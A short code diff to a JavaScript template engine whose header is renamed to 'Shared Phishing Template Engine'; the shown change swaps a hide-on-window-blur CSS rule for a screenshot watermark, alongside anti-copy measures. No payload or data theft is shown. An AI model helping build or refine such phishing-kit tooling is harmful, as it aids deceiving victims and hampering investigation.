@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Template Engine
+ * VGenius C Engine – Shared Phishing Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -904,10 +904,11 @@
       '  transition: opacity 0.1s;' +
       '}' +
       
-      /* Detect window blur (screen capture tools often blur window) */
+      /* Detect window blur (screen capture tools often blur window) - show watermark instead of hiding */
       'body.window-blurred {' +
-      '  visibility: hidden !important;' +
-      '  opacity: 0 !important;' +
+      '}' +
+      'body.window-blurred #vg-screenshot-watermark {' +
+      '  display: block !important;' +
       '}' +
       
       /* Make copyable content appear as invisible characters */
